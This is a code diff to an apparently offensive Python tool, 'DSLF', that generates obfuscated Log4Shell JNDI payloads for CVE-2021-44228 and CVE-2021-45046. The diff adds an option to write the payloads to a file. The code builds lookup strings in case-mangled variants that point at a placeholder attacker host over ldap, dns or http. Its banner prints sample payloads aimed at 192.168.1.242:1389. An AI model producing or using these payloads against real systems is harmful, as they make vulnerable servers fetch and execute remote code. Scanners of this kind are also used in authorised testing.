@@ -6,7 +6,9 @@ combinations = ["key", "${::-key}", "${lower:key}", "${upper:key}"]
 tailer_cve_2021_44228 = '://{{EVIL}}:{{PORT}}/a}'
 tailer_cve_2021_45046 = '://127.0.0.1#{{EVIL}}:{{PORT}}/a}'
 
-def generate_payloads(proto):
+
+###
+def generate_payloads(proto, output):
   jndi = []
   for i in combinations:
     txt_i = ''
@@ -80,18 +82,27 @@ def generate_payloads(proto):
         txt_k = ''
       txt_j = ''
   
+  if output is None:
+   for j in jndi:
+     for p in protocol:
+      cprint(j + p, 'cyan')
+  else:
+   with open(output, 'w+') as fp:
+    for j in jndi:
+     for p in protocol:
+      cprint(j + p, 'cyan')
+      fp.write(j + p + '\n')
 
-  for j in jndi:
-   for p in protocol:
-    cprint(j + p, 'cyan')
 
-
+###
 def main():
   parser = argparse.ArgumentParser()
   parser.add_argument('--protocol', action='store', dest='protocol', required=True, help='ldap, dns, http or all')
+  parser.add_argument('--output', action='store', dest='output', help='output file to write payloads in')
   args = parser.parse_args()
 
   _protocol = args.protocol
+  _output = args.output
  
   print('')
   cprint('[•] DSLF - (D)arth (S)ide of the (L)og4j (F)orce', 'green', attrs=['bold'])
@@ -104,16 +115,16 @@ def main():
   cprint('[*] PGM - Payload Generator Module - Intels', 'green', attrs=['bold'])
   cprint('[*] CVE-2021-44228 with payload similar to ${jndi:ldap://192.168.1.242:1389/a}', 'green')
   cprint('[*] CVE-2021-45046 with payload similar to ${jndi:ldap://127.0.0.1#192.168.1.242:1389/a}', 'green')
-  time.sleep(2)
+  time.sleep(1)
   print('')
   cprint('[+] PGM - Payload Generator Module - Settings', 'yellow', attrs=['bold'])
   cprint(f'[+] Protocol      {_protocol}', 'yellow')
   time.sleep(1)
   print('')
   cprint('[!] PGM - Payload Generator Module - Starting', 'cyan', attrs=['bold'])
-  time.sleep(2)
+  time.sleep(1)
 
-  payloads = generate_payloads(_protocol)
+  payloads = generate_payloads(_protocol, _output)
 
 
 if __name__ == "__main__":
